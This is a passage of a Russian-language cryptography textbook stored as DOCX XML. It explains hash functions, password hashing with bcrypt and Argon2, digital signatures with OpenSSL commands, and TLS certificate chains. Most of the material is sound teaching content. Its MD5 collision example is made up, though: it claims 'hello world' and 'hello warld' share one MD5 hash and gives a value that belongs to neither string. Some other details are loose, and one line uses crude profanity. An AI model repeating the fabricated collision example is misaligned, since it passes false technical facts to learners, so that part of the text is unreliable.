    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Blockchain** (Bitcoin, Ethereum — каждый блок содержит хэш предыдущего блока)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>MD5 (Message Digest 5) — УСТАРЕЛ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Год</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 1991  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Длина хэша</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 128 бит (32 шестнадцатеричных символа)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 2004 году найдена </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>коллизия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (два разных файла с одинаковым MD5). В 2012 году можно найти коллизию за </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>несколько секунд</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на обычном ПК.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>НЕ используй MD5 для безопасности</w:t>
      </w:r>
      <w:r>
        <w:t>. Можно использовать для контрольных сумм (checksums) в ненадёжных условиях, но не для паролей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример коллизии MD5</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Файл 1: "hello world"</w:t>
        <w:br/>
        <w:t>Файл 2: "hello warld" (добавили мусорные байты)</w:t>
        <w:br/>
        <w:t>MD5: 5d41402abc4b2a76b9719d911017c592 (одинаковый!!!)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>SHA-1 (Secure Hash Algorithm 1) — УСТАРЕЛ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Год</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 1995 (NSA)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Длина хэша</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 160 бит (40 шестнадцатеричных символов)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 2017 году Google и CWI Amsterdam нашли </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>коллизию</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (два разных PDF-файла с одинаковым SHA-1). Стоимость атаки: ~$100,000 (на GPU).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>НЕ используй SHA-1</w:t>
      </w:r>
      <w:r>
        <w:t>. Google Chrome с 2017 года помечает HTTPS-сертификаты с SHA-1 как небезопасные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>SHA-256 (SHA-2 family) — твой выбор</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Год</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 2001 (NSA)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Длина хэша</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 256 бит (64 шестнадцатеричных символа)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Варианты</w:t>
      </w:r>
      <w:r>
        <w:t>: SHA-224, SHA-256, SHA-384, SHA-512</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему SHA-256 — лучший выбор?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Стойкий**: Ни одной практической атаки за 20+ лет</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Быстрый**: аппаратное ускорение (SHA Extensions в процессорах Intel/AMD)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Стандарт**: используется везде (Bitcoin, TLS, code signing, Git коммиты)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность взлома</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 2^256 операций (перебрать все варианты). Если весь мир будет перебирать хэши, понадобится </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>миллиарды лет</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: хэш SHA-256 для строки "hello world":</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>echo -n "hello world" | sha256sum</w:t>
        <w:br/>
        <w:t># b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Bitcoin (proof-of-work: SHA-256(SHA-256(block header)))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Git (коммиты, теги)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TLS (подписание сертификатов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Code signing (проверка подлинности приложений)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>SHA-3 (Keccak)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Год</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 2015 (NIST)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Длина хэша</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 224, 256, 384, 512 бит  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Отличие от SHA-2</w:t>
      </w:r>
      <w:r>
        <w:t>: Другая внутренняя структура (sponge construction)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> На случай, если в SHA-2 найдут уязвимость. Пока SHA-2 держится, SHA-3 используется редко.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Хранение паролей: почему MD5/SHA-256 — плохо?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема 1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Хэш-функции </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>быстрые</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Современная видеокарта (NVIDIA RTX 4090) может вычислить </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>100 миллиардов SHA-256 хэшей в секунду</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Если пароль простой (например, "password123"), его взломают за </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>доли секунды</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема 2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Rainbow tables</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — предвычисленные таблицы хэшей для популярных паролей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: использовать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>медленные хэш-функции</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>соль</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (salt).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>bcrypt, scrypt, Argon2 — для паролей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>bcrypt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (1999):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Медленный (специально)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Адаптивный: можно задать **cost factor** (количество раундов). Чем больше раундов, тем медленнее (сегодня рекомендуется 12-14 раундов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Соль** (128-битное случайное число) добавляется автоматически</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (bcrypt в Python):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>import bcrypt</w:t>
        <w:br/>
        <w:br/>
        <w:t># Хэшируем пароль</w:t>
        <w:br/>
        <w:t>password = b"super_secret_password"</w:t>
        <w:br/>
        <w:t>hashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))</w:t>
        <w:br/>
        <w:t>print(hashed)</w:t>
        <w:br/>
        <w:t># b'$2b$12$abcdefghijklmnopqrstuv1234567890ABCDEFGHIJ'</w:t>
        <w:br/>
        <w:br/>
        <w:t># Проверка пароля</w:t>
        <w:br/>
        <w:t>if bcrypt.checkpw(password, hashed):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("Пароль верный!")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аргон2 (Argon2)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — победитель Password Hashing Competition 2015:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ещё медленнее bcrypt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Защита от GPU/ASIC атак (требует много памяти)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Три варианта: Argon2d (против GPU), Argon2i (против side-channel атак), Argon2id (гибрид, **рекомендуется**)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Для хранения паролей используй </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Argon2id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (если доступен) или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>bcrypt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (если нет).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.2.5. Цифровые подписи: как доказать авторство</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты отправляешь документ (например, контракт). Как доказать, что:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Документ отправил именно ты** (аутентификация)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Документ не изменён** (целостность)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Цифровая подпись</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Хэшируем документ** (SHA-256)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифруем хэш** своим **приватным ключом** (RSA/ECC)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Отправляем** документ + подпись</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Хэшируем документ** (SHA-256)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расшифровываем подпись** публичным ключом отправителя → получаем хэш</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сравниваем** два хэша. Если одинаковые → подпись валидна.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему это работает?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Только ты знаешь свой **приватный ключ** → только ты мог создать подпись</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если документ изменён, хэш будет другим → подпись не совпадёт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Code signing** (подписание приложений, драйверов Windows)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Юридические документы** (электронная подпись в России — 63-ФЗ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Email** (S/MIME, PGP/GPG)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Blockchain** (Bitcoin транзакции подписываются ECDSA)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Подписание файла с помощью OpenSSL (RSA):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Генерация ключей</w:t>
        <w:br/>
        <w:t>openssl genrsa -out private_key.pem 2048</w:t>
        <w:br/>
        <w:t>openssl rsa -in private_key.pem -pubout -out public_key.pem</w:t>
        <w:br/>
        <w:br/>
        <w:t># Подписание файла</w:t>
        <w:br/>
        <w:t>openssl dgst -sha256 -sign private_key.pem -out signature.bin document.pdf</w:t>
        <w:br/>
        <w:br/>
        <w:t># Проверка подписи</w:t>
        <w:br/>
        <w:t>openssl dgst -sha256 -verify public_key.pem -signature signature.bin document.pdf</w:t>
        <w:br/>
        <w:t># Выведет: Verified OK (если подпись валидна)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.2.6. Сертификаты и PKI (Public Key Infrastructure)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Ты скачал публичный ключ `public_key.pem`. Как убедиться, что это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>реальный</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> публичный ключ `google.com`, а не ключ хакера?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Центры сертификации (CA)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — доверенные организации, которые </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>подписывают</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> публичные ключи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PKI (Public Key Infrastructure)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — система, включающая:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**CA (Certificate Authority)** — центр сертификации (Let's Encrypt, DigiCert, GlobalSign)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**RA (Registration Authority)** — проверяет личность заявителя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сертификаты** — документы, связывающие публичный ключ с владельцем</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**CRL/OCSP** — списки отозванных сертификатов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Как работает HTTPS (TLS/SSL сертификаты)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ты заходишь на `https://google.com`**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Google отправляет свой сертификат** (содержит публичный ключ Google + подпись CA)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Твой браузер проверяет**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сертификат подписан доверенным CA (список CA встроен в браузер/ОС)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Доменное имя совпадает (`google.com`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Срок действия не истёк</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сертификат не отозван (проверка CRL/OCSP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Если всё OK** → зелёный замочек, соединение безопасно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Если нет** → предупреждение "Ваше соединение не защищено"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример сертификата</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (X.509):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Certificate:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Subject: CN=google.com</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Issuer: CN=GTS CA 1P5</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Validity: 2024-01-10 to 2024-04-10</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Public Key: RSA 2048 bit</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Signature Algorithm: SHA256-RSA</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Цепочка доверия (Chain of Trust)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Root CA (DigiCert, встроен в браузер)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  └─&gt; Intermediate CA (GTS CA 1P5)</w:t>
        <w:br/>
        <w:t xml:space="preserve">      └─&gt; End-entity certificate (google.com)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему промежуточные CA?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Root CA** используется редко (если скомпрометируют — пиздец всему интернету)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Intermediate CA** выпускают сертификаты для сайтов. Если скомпрометируют — можно отозвать только промежуточный сертификат.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
